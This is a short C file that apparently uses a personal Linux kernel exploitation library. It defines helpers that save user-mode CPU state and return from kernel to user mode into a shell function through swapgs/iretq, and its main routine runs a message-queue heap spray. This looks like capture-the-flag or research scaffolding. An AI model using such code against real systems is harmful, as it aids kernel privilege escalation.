#include "libx.h"
//https://github.com/n132/libx/tree/main
/*
    Libx Init Starts
*/
#if defined(LIBX)
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    size_t back2root = shell;
    void back2userImp(){
        __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
            );
    }
    void libxInit(){
        back2user = back2userImp;
        hook_segfault();
        saveStatus();
    }
#endif // 
int main(){
    // save_status();
    // hook_segfault();
    // char *p = 0;
    // char pp = *p;
    //msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    
    msgSpray_t *spray = msgSpray(0x50,0x100,"n132");
    msgSprayClean(spray);

}